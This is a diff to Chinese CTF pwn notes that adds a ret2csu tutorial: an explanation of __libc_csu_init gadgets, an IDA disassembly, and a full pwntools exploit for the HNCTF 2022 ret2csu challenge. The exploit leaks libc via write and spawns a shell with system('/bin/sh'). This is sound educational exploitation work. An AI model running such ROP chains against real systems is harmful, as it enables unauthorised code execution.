@@ -37,6 +37,10 @@ p.interactive()
 
     nssctf{W@rn1ng,Sh31lc0de_inj3ct3r!!!}
 
+## ret2syscall
+
+
+
 ## ret2libc
 
 以CISCN 2019 东北的Pwn2为例，先**checksec**一下
@@ -149,3 +153,143 @@ p.sendlineafter("choice!\n",str(1))
 p.sendlineafter("encrypted",payload)
 p.interactive()
 ~~~
+
+## ret2csu
+
+### 原理
+
+由于一般程序都会调用**libc**函数，从而一定会存在**__libc_csu_init**这个函数对libc进行初始化，所以可以对其中的**gadget**进行利用，只是不同版本的函数内容有所不同而已。
+
+~~~asm
+.text:0000000000401250                               ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)
+.text:0000000000401250                               public __libc_csu_init
+.text:0000000000401250                               __libc_csu_init proc near               ; DATA XREF: _start+1A↑o
+.text:0000000000401250                               ; __unwind {
+.text:0000000000401250 F3 0F 1E FA                   endbr64
+.text:0000000000401254 41 57                         push    r15
+.text:0000000000401256 4C 8D 3D B3 2B 00 00          lea     r15, __frame_dummy_init_array_entry
+.text:000000000040125D 41 56                         push    r14
+.text:000000000040125F 49 89 D6                      mov     r14, rdx
+.text:0000000000401262 41 55                         push    r13
+.text:0000000000401264 49 89 F5                      mov     r13, rsi
+.text:0000000000401267 41 54                         push    r12
+.text:0000000000401269 41 89 FC                      mov     r12d, edi
+.text:000000000040126C 55                            push    rbp
+.text:000000000040126D 48 8D 2D A4 2B 00 00          lea     rbp, __do_global_dtors_aux_fini_array_entry
+.text:0000000000401274 53                            push    rbx
+.text:0000000000401275 4C 29 FD                      sub     rbp, r15
+.text:0000000000401278 48 83 EC 08                   sub     rsp, 8
+.text:000000000040127C E8 7F FD FF FF                call    _init_proc
+.text:000000000040127C
+.text:0000000000401281 48 C1 FD 03                   sar     rbp, 3
+.text:0000000000401285 74 1F                         jz      short loc_4012A6
+.text:0000000000401285
+.text:0000000000401287 31 DB                         xor     ebx, ebx
+.text:0000000000401289 0F 1F 80 00 00 00 00          nop     dword ptr [rax+00000000h]
+.text:0000000000401289
+.text:0000000000401290
+.text:0000000000401290                               loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j
+.text:0000000000401290 4C 89 F2                      mov     rdx, r14
+.text:0000000000401293 4C 89 EE                      mov     rsi, r13
+.text:0000000000401296 44 89 E7                      mov     edi, r12d
+.text:0000000000401299 41 FF 14 DF                   call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
+.text:0000000000401299
+.text:000000000040129D 48 83 C3 01                   add     rbx, 1
+.text:00000000004012A1 48 39 DD                      cmp     rbp, rbx
+.text:00000000004012A4 75 EA                         jnz     short loc_401290
+.text:00000000004012A4
+.text:00000000004012A6
+.text:00000000004012A6                               loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j
+.text:00000000004012A6 48 83 C4 08                   add     rsp, 8
+.text:00000000004012AA 5B                            pop     rbx
+.text:00000000004012AB 5D                            pop     rbp
+.text:00000000004012AC 41 5C                         pop     r12
+.text:00000000004012AE 41 5D                         pop     r13
+.text:00000000004012B0 41 5E                         pop     r14
+.text:00000000004012B2 41 5F                         pop     r15
+.text:00000000004012B4 C3                            retn
+.text:00000000004012B4                               ; } // starts at 401250
+.text:00000000004012B4
+.text:00000000004012B4                               __libc_csu_init endp
+~~~
+
+这里我们主要关注**loc_401290**和**loc_4012A6**部分
+
+- **loc_401290**中，将寄存器r14，r13，r12d的值分别赋值给了寄存器rdx，rsi，edi，我们可以通过**loc_401290**控制寄存器rdx，rsi和edi(rdi的低32位)
+- **loc_4012A6**中从栈中把数据pop给了rbx，rbp，r12，r13,r14,r15，可以通过栈溢出来控制这六个寄存器
+- **loc_401290**从**0x40129D**到**0x4012A4**，对寄存器rbp和rbx做了比较，若不相等则重复执行**loc_401290**，我们需要构造关系**rbp = rbx + 1**使它不进入循环。
+
+### 例子
+
+以[HNCTF 2022 WEEK2]ret2csu为例，首先checksec一下
+
+![ret2csu-checksec](./assets/ret2csu-checksec.png)
+
+64位，只开了NX
+
+丢入IDA查看
+
+![ret2csu-vuln](./assets/ret2csu-vuln.png)
+
+有一个简单的栈溢出，但没有**system函数地址**和**/bin/sh字符串**，但存在**write**，我们能通过泄露libc，然后自己构造。
+
+思路：
+
+1. 先使用**__libc_csu_init**控制寄存器泄露**write**地址
+2. 使用**LibcSearcher**找到libc版本，得到基址
+3. 最后得到**system**和**/bin/sh**的地址得到权限
+   
+exp：
+
+~~~python
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+context(arch='amd64',os='linux',log_level='debug')
+
+p = remote("node5.anna.nssctf.cn","28888")
+
+elf = ELF("./ret2csu")
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+csu_front_addr = 0x401290
+csu_end_addr = 0x4012AA
+pop_rdi_addr = 0x4012B3
+ret_addr = 0x40101A
+main_addr = 0x4011DC
+
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = b'a' * (0x100+0x8) 
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
+        r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += b'a' * 0x38
+    payload += p64(last)
+    p.sendlineafter('Input:\n',payload)
+    sleep(1)
+
+csu(0,1,1,write_got,8,write_got,main_addr)
+write_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+print(hex(write_addr))
+
+libc = LibcSearcher('write',write_addr)
+base_addr = write_addr - libc.dump('write')
+system = base_addr + libc.dump('system')
+binsh = base_addr + libc.dump('str_bin_sh')
+
+payload = b'a'*0x108+p64(0x40101A) +p64(pop_rdi_addr)+p64(binsh) +p64(system)
+
+p.sendlineafter('Input:\n',payload)
+p.interactive()
+~~~
+
+运行结果：
+
+![ret2csu-flag](./assets/ret2csu-flag.png)
